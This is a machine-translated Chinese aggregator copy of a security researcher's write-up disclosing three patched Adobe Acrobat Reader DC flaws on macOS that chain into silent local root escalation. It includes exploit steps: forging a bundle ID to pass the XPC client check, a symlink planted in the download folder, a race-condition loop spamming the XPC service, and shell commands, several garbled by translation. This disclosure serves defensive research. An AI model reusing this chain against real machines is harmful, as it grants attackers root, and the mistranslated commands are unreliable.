<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Adobe Acrobat Reader中的安全漏洞允许以静默方式在MacOS上获得根</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Adobe Acrobat Reader中的安全漏洞允许以静默方式在MacOS上获得根</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-05-15 00:05:40</div><div class="story_img_container"><img src="http://img.diglog.com/img/2020/5/3a20791feb41759f3f28e4058962a161.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></div><div class="page_narrow text-break page_content"><p>今天，Adobe Acrobat Reader DC for MacOS修补了我报告的三个关键漏洞(CVE-2020-9615、CVE-2020-9614和CVE-2020-9613)。触发漏洞的唯一要求是已安装Adobe Acrobat Reader DC。MacOS上的普通用户(启用了SIP)可以在用户不知情的情况下本地利用此漏洞链将权限提升到根目录。在本博客中，我将分析漏洞的详细信息，并展示如何利用它们。</p><p>根进程拥有超强的功能，它几乎可以做任何事情，读/写所有敏感的文件/数据库，如图像/日历。然而，在现代MacOS中，沙箱外的根进程很少，大多数MacOS内置服务都在沙箱中运行。他们不再是国王，他们将自己囚禁在基于声明性沙盒配置文件规则的笼子里。</p><p>好消息是，除了MacOS内置服务之外，具有高特权服务的流行软件是新的好目标，所以Adobe Acrobat Reader DC引起了我的注意。</p><p>/Library/PrivilegedHelperTools/中的com.adobe.ARMDC.SMJobBless Helper是Adobe Acrobat Reader DC的组件之一，负责软件更新。它以根用户和无沙箱应用的身份运行，并托管名为SMJobBlessHelper(com.adobe.ARMDC.SMJobBlessHelper).的xpc服务。大多数xPC服务在执行任何实际工作之前都会检查其连接客户机，SMJobBless Helper也是如此。</p><p>SMJobBless Helper基于NSXPC，其客户端检查存在于[SMJobBless Helper Listener：shouldAcceptNewConnection：]中。检查逻辑如下图伪代码所示，获取客户端的PID，然后根据客户端的进程路径获取Bundle ID，如果Bundle ID为“com.adobe.ARMDC”，则客户端是可信的。</p><p>pid=[NSXPCConnection processIdentifier]；proc_pidpath(v7，proc_path，0x1000u)；bundle=[NSBundle bundleWithPath：proc_path]；bd_id=[bundle bundleIdentifier]；if(bd_id==&#34；com.adobe.ARMDC&#34；){//接受客户端的xPC连接请求}。</p><p>苹果称它是“存储在磁盘捆绑目录中的代码和资源的表示”，所以它只是一个目录结构，包含一些定义良好的子目录/文件。包ID从目录结构的Contents/Info.plist获得。</p><p>目录结构肯定是不可信的，我们可以通过创建特殊的捆绑包目录来伪造任何捆绑包ID。</p><p>如下图所示，在SMJobBless Helper启动ARMDCHammer之前的更新过程中，下载文件夹(在包的父目录中)将移动到/var/Folders/ZZ/xxxxx/T/。不幸的是，在目录移动之后，“/var/folders/zz/xxxxx_n0000000000000/T/download”的所有者是根用户，普通用户无权访问它。所以这意味着我们不能再更改它及其子文件。</p><p>如果./download/ARMDCHammer是一个符号链接，那么在移动到/var/Folders/ZZ/xxxxx/T/download之后，该符号链接是否仍然有效？</p><p>是的，符号链接仍然有效，它可以帮助我们绕过临时目录保护。我可以强制/var/Folders/ZZ/xxxxx/T/download/ARMDCHammer链接到任何地方。</p><p>validateBinary和LaunchARMHammer都使用程序路径，我们对该路径有写入权限。</p><p>因此，如果我们可以在validateBinary之后将“/tmp/test/hello_root”替换为我们的恶意文件，则LaunchARMHammer将启动我们的恶意进程。</p><p>你可能会认为比赛条件窗口太窄，无法控制，我稍后会展示这些技巧。</p><p>如前所述，NSBundle不受信任，因此我们尝试伪造一个NSBundle，其包id为“com.adobe.ARMDC”。为了节省时间，我们从“/Library/Application Support/Adobe/ARMDC/Application/Adobe Acrobat Updater.app”复制了Adobe的原始捆绑包。</p><p>cd/tmp/test/exploit echo&#34；编译SMJobBless Helper-Developit&#34；clang-framework Foundation SMJobBless Helper-Developit.m-o SMJobBless Helper-Developit echo&#34；Move SMJobBless Helper-Developit to Adobe Acrobat Updater.app&#34；mkdir&#34；Adobe Acrobat Updater.app/Contents/MacOS&#34；MV SMJobBless Helper-Developit(将SMJobBless Helper-Developit移动到Adobe Acrobat Updater.app/Contents/MacOS&#34；MV)</p><p>现在，作为NSXPC客户端启动的SMJobBless Helper-Developit将通过[SMJobBless Helper Listener：shouldAcceptNewConnection：]的检查。</p><p>Symlink可以帮助我们，在SMJobBless Helper移动我们的下载目录之前，我们会在我们的下载目录中创建一个符号链接。</p><p>$cd/tmp/test$mkdir下载$ln-s/tmp/test/hello_root./download/ARMDCHammer$ls-l download/total 0 lrwxr-xr-x 1 rekken Staff 72 4 12 16：04 ARMDCHammer-&gt；/tmp/test/hello_root。</p><p>$sudo ls-l/var/Folders/zz/xxxxx/T/下载总数0 lrwxr-xr-x 1个注册员工72 4 12 16：04 ARMDCHammer-&gt；/tmp/test/hello_root。</p><p>(Lldb)po$RCX(&#34；--Verify&#34；，&#34；-R=标识符ARMDCHammer和锚定可信和锚定苹果通用和证书叶[subject.CN]=\&#34；开发者ID应用程序：Adobe Systems，Inc.。(JQ525L2MZD)\&#34；&#34；，&#34；/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/download/ARMDCHammer&#34；)。</p><p>我编写了一个脚本，在整个本地磁盘中搜索ARMDCHammer，最后一无所获。但它肯定存在，不是吗？</p><p>由于它不在本地驱动器上，因此应该已按需下载。我翻转了很多二进制文件，在Acrobat Update Helper.app中找到了可爱的下载URL。下载并解压缩归档文件，最后，我找到了我正在寻找的ARMDCHammer。</p><p>$CoDesign--Verbose--Verify-R=&#34；标识符ARMDCHammer和锚定受信任和锚定苹果通用和证书叶[subject.CN]=\&#34；开发者ID应用程序：Adobe Systems，Inc.。(JQ525L2MZD)\&#34；&#34；~/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer：在磁盘/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer：上有效满足其指定要求/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer：显式要求得到满足</p><p>validateBinary和LaunchARMHammer之间的时间窗口较窄。OPLock可以帮助我们在Windows中冻结时间，不幸的是，在MacOS中没有这样的选择。</p><p>步骤1：将/tmp/test/ARMDCHammer移至/tmp/test/hello_root，步骤2：休眠步骤3：将/tmp/test/hello_root移至/tmp/test/ARMDCHammer步骤4：休眠并转至步骤1。</p><p>步骤1：创建/tmp/test/orig_download目录，创建symlink/tmp/test/orig_download/ARMDCHammer指向/tmp/test/hello_root步骤2：将/tmp/test/orig_download复制到/tmp/test/download步骤3：休眠步骤4：当/tmp/test/download消失时转至步骤2。</p><p>WHILE(1){NSXPCConnection*ConnectionToService=[[NSXPCConnection Alalloc]initWithMachServiceName：@&#34；com.adobe.ARMDC.SMJobBlessHelper&#34；选项：0]；ConnectionToService.remoteObjectInterface=[NSXPCInterface interfaceWithProtocol：@protocol(SMJobBlessHelperProtocol)]；[ConnectionToService Resume]；id Remote=[ConnectionToService remoteObjectProxyWithErrorHandler：^(NSError*proxyError){NSLog(@&#34；Error：%@&#34；，proxyError)；}。</p><p>我们需要线程1的原因很明显，为什么我们需要单独的线程2和线程3？</p><p>使服务器繁忙的高频NSXPC接口调用请求会增加成功的概率。在多线程运行的情况下，争用条件需要非常短的时间。在我的测试中，大多数测试用例只需要1~3秒，而最好的用例只需要转瞬即逝的时间。</p><p>漏洞补丁最重要的部分是添加了一个名为-[SMJobBless Helper validatePath]的新函数，在validateBinary和启动之前，它会检查路径是否为符号链接。它打破了唯一必须通过的道路。</p><p>bool-[SMJobBless Helper验证路径](路径){if(fileIsSymbolicLink(Path)){Return False；}Return True}DoWorkAndLauchHammer(){Move(&#34；./Download&34；，&#34；/var/Folders/ZZ/xxxxx/T/Download&#34；)；if(validatePaths(&#34；/var/folders/zz/xxxxx/T/download&#34；)){if(validateBinary(&#34；/var/folders/zz/xxxxx/T/download&#34；)){launch(&#34；/var/folders/zz/xxxxx/T/download&#34；)；}</p><p>在这篇博客中，我分析了Adobe Acrobat Reader中的三个逻辑漏洞，并展示了如何利用它们在没有沙箱限制的情况下获得根。作为几乎每个设备都需要的软件，它的安全性对MacOS至关重要。</p></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://rekken.github.io/2020/05/14/Security-Flaws-in-Adobe-Acrobat-Reader-Allow-Malicious-Program-to-Gain-Root-on-macOS-Silently/">https://rekken.github.io/2020/05/14/Security-Flaws-in-Adobe-Acrobat-Reader-Allow-Malicious-Program-to-Gain-Root-on-macOS-Silently/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/漏洞/">#漏洞</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/adobe/">#adobe</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/acrobat/">#acrobat</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/flaws/">#flaws</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1002091.html"><img src="http://img.diglog.com/img/2020/5/thumb_22cc0c7b4e377b50e282dfcbd2f137f1.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1002091.html">Stuxnet的遗产在新的Windows漏洞中继续存在</a></div><span class="my_story_list_date">2020-5-14 21:58</span></div><div class="col-sm"><div><a target="_blank" href="/story/1002029.html"><img src="http://img.diglog.com/img/2020/5/thumb_78711094ed64c2c8ce0c89c24817a9fc.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1002029.html">PrintDemon漏洞影响所有Windows版本</a></div><span class="my_story_list_date">2020-5-14 6:21</span></div><div class="col-sm"><div><a target="_blank" href="/story/1001659.html"><img src="http://img.diglog.com/img/2020/5/thumb_603b7d33f61318b4f8a40a72f3fadf67.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1001659.html">迅雷漏洞让黑客在“五分钟”内窃取你的数据</a></div><span class="my_story_list_date">2020-5-11 15:14</span></div><div class="col-sm"><div><a target="_blank" href="/story/1001608.html"><img src="http://img.diglog.com/img/2020/5/thumb_3e7cc934a8e975fea96a4ce363841d7f.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1001608.html">迅雷漏洞使数百万台PC暴露在亲身经历的黑客攻击之下</a></div><span class="my_story_list_date">2020-5-11 10:12</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/app/">#app</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/病毒/">#病毒</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/冠状病毒/">#冠状病毒</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/linux/">#linux</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>